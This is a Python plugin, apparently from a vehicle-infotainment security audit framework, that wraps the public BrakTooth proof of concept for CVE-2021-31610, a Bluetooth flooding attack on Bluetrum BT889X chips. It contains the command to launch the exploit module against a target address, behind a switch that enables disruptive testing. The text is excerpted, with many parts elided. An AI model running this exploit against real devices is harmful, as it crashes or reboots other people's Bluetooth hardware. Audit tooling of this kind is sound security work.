#!/usr/bin/env python3
"""CVE-2021-31610 – BrakTooth BT Classic: AU Rand Flooding – Bluetrum BT SoC AU random number flooding.

Public PoC source: https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
  Attack module: au_rand_flooding
  Target chip: Bluetrum BT889X
...
Usage:
  Load exploit module "au_rand_flooding" via WDissector:
    sudo ./wdissector --exploit=au_rand_flooding --target=<bdaddr>
"""
...
VULN = {
    ...
    "year": 2021,
    "domain": "wireless",
    "vendor_product": "Bluetrum BT889X Bluetooth Classic SoC",
    "component": "Bluetooth Classic LMP / HCI stack",
    "type": "BT Classic protocol attack → DoS / crash / RCE",
    "summary": "AU Rand Flooding – Bluetrum BT SoC AU random number flooding",
...
def _run_poc(plugin):
    ...
    evidence = {
        "cve": "CVE-2021-31610",
        "braktooth_module": "au_rand_flooding",
        "target_chip": "Bluetrum BT889X",
        ...
        "attack_surface": "Bluetrum BT889X/AB5XX BT SoC AU rand flooding → crash/reboot",
    }
    ...
    if allow_disruptive and target:
        ...
        cmd[1] = f"--exploit=au_rand_flooding"
    ...
    return {
        ...
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "Matheus-Garbelini/braktooth / module: au_rand_flooding",
    }


_module = "au_rand_flooding"  # exploit module name
try:
...
class Poc109CVE202131610BrakToothBtClassicAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-109"
    meta_poc_name   = 'CVE-2021-31610 BrakTooth BT889X AU RAND Flooding Active Validation'
    meta_cve_id     = "CVE-2021-31610"
    meta_severity   = "High"
    ...
    meta_attack_surface = "Bluetrum BT889X/AB5XX BT SoC AU rand flooding → crash/reboot"
    is_disruptive   = True
...
if __name__ == "__main__":
    ...
    _desc = VULN.get("summary", "109_AU_Rand_Flooding__Bluetrum_BT_SoC_AU_ra_Audit") if "VULN" in dir() else "109_AU_Rand_Flooding__Bluetrum_BT_SoC_AU_ra_Audit"
    ...
    _plugin = Poc109CVE202131610BrakToothBtClassicAuditPlugin({
